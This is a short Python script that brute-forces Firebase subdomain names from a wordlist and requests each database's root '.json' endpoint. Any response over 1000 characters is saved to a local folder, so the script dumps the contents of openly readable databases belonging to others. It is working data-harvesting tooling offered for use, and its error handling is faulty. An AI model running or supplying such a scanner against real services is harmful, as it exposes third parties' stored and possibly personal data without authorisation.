import requests


#minimum amount of characters a database should have
RESPONSE_THRESHOLD = 1000

#subdomain wordlist
wordlist = "demo_wordlist.txt"



#read word list from file
for line in open("wordlists/%s" % wordlist, "r").readlines():

	#prepare URL
	word = line.rstrip()
	url = "https://%s.firebaseio.com/.json" % word



	#request the database
	try:
		response = requests.get(url).text

	#in case the request fails, ignore
	except Exception as e:
		pass



	#only store if meets the size threshold
	if len(response) >= RESPONSE_THRESHOLD:

		with open("database/" + word, "w+") as file:
			file.write(response)
			
			print(url)
